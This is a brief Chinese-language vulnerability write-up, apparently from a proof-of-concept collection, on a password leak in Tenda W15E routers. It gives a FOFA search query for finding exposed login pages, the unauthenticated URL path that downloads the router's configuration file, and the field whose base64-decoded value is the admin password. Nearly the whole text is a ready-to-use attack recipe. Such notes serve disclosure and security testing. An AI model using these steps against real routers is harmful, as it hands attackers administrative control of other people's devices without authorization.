# Tenda密码泄露

## 漏洞描述

腾达W15E路由器系统存在密码泄露漏洞，攻击者通过漏洞可以获取应用后台权限。

## 指纹

`fofa: title=="Tenda | Login"`

## 漏洞验证

### 密码泄露

访问 **`http:{url}/cgi-bin/DownloadCfg/RouterCfm.cfg`**，下载配置文件。

搜索`sys.userpass`

![userpass](./images/1.png)

`base64`解码后即为后台密码。
